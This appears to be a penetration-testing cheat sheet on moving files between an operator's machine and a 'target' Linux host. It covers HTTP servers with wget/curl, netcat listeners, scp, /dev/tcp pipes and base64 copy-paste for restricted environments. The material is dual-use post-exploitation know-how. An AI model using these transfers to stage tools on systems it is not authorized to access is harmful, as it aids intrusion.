---
title: "File Transfer (Linux To Linux)"
date: 2024-6-26
tags: ["file transfer", "nc", "scp"]
---

---
### HTTP

```bash
# Start a local HTTP server
python3 -m http.server 80
```

```bash
# In target Linux machine
wget <LOCAL_IP>/<FILE>
```

```bash
# In target Linux machine
curl <LOCAL_IP>/<FILE> -o <REMOTE_DEST_PATH>
```

<br>

---

### nc

```bash
# In our local Linux machine
nc -lvnp 4444 < <FILE>
```

```bash
# In target Linux machine
nc -w3 <LOCAL_IP> 4444 > <FILE>
```

<br>

---

### scp

#### Remote to Local

```bash
# If you have target password
scp <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
```

```bash
# If you have a ssh key
scp -i id_rsa <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
```

#### Local to Remote

```bash
# If you have target password
scp <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
```

```bash
# If you have a ssh key
scp -i id_rsa <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
```

<br>

---

### pipe

#### Local to Remote

```bash
# In our local Linux machine
cat <FILE> | nc -lnvp 4444
```

```bash
# In target Linux machine
exec 3<>/dev/tcp/<LOCAL_IP>/4444
```

```bash
# Ctrl+C to interrupt after some time
cat <&3 > <FILE>
```

```bash
# Check
md5sum <FILE>
```

<br>

---

### Base64 Encoding (for small binary)

```bash
# Base64 encode binary
cat <FILE> | base64 -w0
```

```bash
# Copy and paste the base64 encoded binary
echo -n '<BASE64_FILE>' | base64 -d > <FILE>
```

<small>*Note: For restricted environment*</small>